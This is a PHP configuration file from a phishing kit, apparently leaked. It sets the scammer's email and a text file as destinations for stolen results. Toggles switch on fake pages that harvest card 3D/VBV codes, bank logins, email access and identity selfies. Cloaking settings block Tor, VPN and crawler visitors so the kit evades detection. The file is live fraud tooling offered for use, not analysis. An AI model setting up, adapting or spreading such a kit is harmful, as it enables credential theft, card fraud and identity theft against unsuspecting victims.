<?php
/*
▄▄▌  ▄▄▄ . ▄▄▄· ▄ •▄  ▄▄·       ·▄▄▄▄  ▄▄▄ .
██•  ▀▄.▀·▐█ ▀█ █▌▄▌▪▐█ ▌▪▪     ██▪ ██ ▀▄.▀·
██▪  ▐▀▀▪▄▄█▀▀█ ▐▀▀▄·██ ▄▄ ▄█▀▄ ▐█· ▐█▌▐▀▀▪▄
▐█▌▐▌▐█▄▄▌▐█ ▪▐▌▐█.█▌▐███▌▐█▌.▐▌██. ██ ▐█▄▄▌
.▀▀▀  ▀▀▀  ▀  ▀ ·▀  ▀·▀▀▀  ▀█▄▀▪▀▀▀▀▀•  ▀▀▀ 
*/
	// ================================= //
	// ================================= //
	$redirectlink = "l34kc0de.today";	 	 // You must use redirect or the scam will not open
	// ================================= //
	// ================================= //
	// This is your Scama Key if you post the scam will banned Don`t edit it =D
	$API_KEY = "FUCKED_BY_DNTHIRTEEN_L34KC0DE";
	// This is your Scama Key if you post the scam will banned Don`t edit it =D
	// ================================= //
	// ================================= //
	$scamname = "Kareem"; // *Change |xAthena| to any name you want |Your Nick Name|
	// ================================= //
	// ================================= //
	$saveintext = "yes";   // If you don`t want the scam save the Rezlt/ Result in Text Edit |yes| to |no|
	$filename = "A_k_A"; // Change |stored| to any name you want this will be the Rzlt file name
	// ================================= //
	// ================================= //
	$sendtoemail = "yes";  // If you don`t want the scam Send the Rezlt/ Result to email Edit |yes| to |no|
	$yours = "kareemspamer@yandex.com"; 	 // Edit this to your email 
	// ================================= //
	// ================================= //
	$show_captcha ="no"; 				 // If you don`t want to show ||Captcha Page|| edit |yes| to |no| 
	$show_unusual_activity ="no"; 		 // If you don`t want to show ||Unusual Activity|| edit |yes| to |no|
	$show_3D_VBV ="no"; 				 // If you don`t want to show ||3D/VBV Page|| edit |yes| to |no| 
	$show_newcard ="no"; 				 // If you don`t want to show ||Link New Card Page|| edit |yes| to |no|
	$show_mailaccess ="no"; 			 // If you don`t want to show ||Mail Access Page|| edit |yes| to |no| 
	$show_bank ="no"; 					 // If you don`t want to show ||Bank Page|| edit |yes| to |no| 
	$show_identity ="yes"; 				 // If you don`t want to show ||Identity/Selfiy|| edit |yes| to |no| 
	// ================================= //
	// ================================= //
	// ********* IP Protection ********* //
	$ip_protection = "no"; 			     // If you don`t want to use IP Protection change yes to no
	$ip_protection_api = "LYEX8EmkYEoO9wuWuMRtREVaFcD1hlpH"; // Dont touch :()
	$max_fraud_score = "75";			// Put max fraud score 
	$fuck_tor = "true";					// If you don`t want to disallow Tor Users change true to xAthena
	$fuck_vpn = "true";					// If you don`t want to disallow VPN Users change true to xAthena
	$fuck_crawler = "true";				// If you don`t want to disallow Crawler Users change true to xAthena
	// ================================= //
	// ================================= //
	/////////////////DATE-function//////////////////////
	function now() {
		date_default_timezone_set('GMT');
		return date("d/m/Y h:i:sa");
	}
	/////////////////DATE-function//////////////////////

?>